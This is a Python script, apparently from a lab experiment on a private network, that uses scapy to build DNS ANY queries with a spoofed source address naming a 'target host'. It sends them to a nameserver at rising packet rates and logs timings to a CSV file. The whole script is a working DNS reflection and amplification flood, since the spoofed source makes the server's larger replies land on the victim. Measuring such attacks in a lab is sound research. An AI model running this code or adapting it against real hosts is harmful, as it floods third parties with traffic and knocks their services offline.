#!/usr/bin/env python
from scapy.all import DNS, DNSQR, IP, send, UDP, DNSRROPT, Ether, sendp, sendpfast
import numpy as np
import time 
import random 

random.seed(1313)
random.randint(0,255)

target = "10.0.0.141"  # Target host
nameserver = "10.0.0.183"  # DNS server
domain = "llanfairpwllgwyngyllgogerychwyrndrobwllllantysiliogogogoch.co.uk"  # Some domain name like "google.com" etc.



ip = IP(dst=nameserver, src=target)
udp = UDP(dport=53)
# dns = DNS(id = random.randint(0,255), opcode= 0, rd=1, ad=1, rcode=0, qd=DNSQR(qname=domain, qtype=255, qclass="IN"), ar=DNSRROPT(rclass=4096))
# dns = DNS(id = random.randint(0,255), opcode= 0, rd=1, ad=1, rcode=0,qd=DNSQR(qname=domain, qtype=255, qclass=4096), ar=DNSRROPT(rdlen=12, rdata= []))
dns = DNS(id = random.randint(0,255), rd=1, qd=DNSQR(qname=domain, qtype=255))





request = (Ether()/ip/udp/dns)

print(dns.show())







# n_levels = 7
# packets_level = []

# for x in range(n_levels): 
#     packets_level.append(1*(10**x))

total_packets_sent = 0
file = open('timestamps.csv', 'a+')
file.write(f'"level","n_packets","time_elapsed"')
file.close()    


level = 1

j = 1*(10**level)

# k=1
 
start = time.time()
req_list = []

##for i in range(1000000): 
    #req_list.append(request)
req_list.append(request)
#answer = sendp(req_list, verbose=1, inter=1./j)
print(f'packets / second : {j}') 
answer = sendpfast(req_list, iface="wlp0s20f3", pps=j, loop=j*100, parse_results=1)
print(answer)
total_packets_sent += len(req_list)
end = time.time()
file = open('timestamps.csv', 'a+')
file.write(f'\n{level},{j},{end-start}')
file.close()    
# k+=1
time.sleep(1) 

print(f'total_packets_sent = {total_packets_sent}')
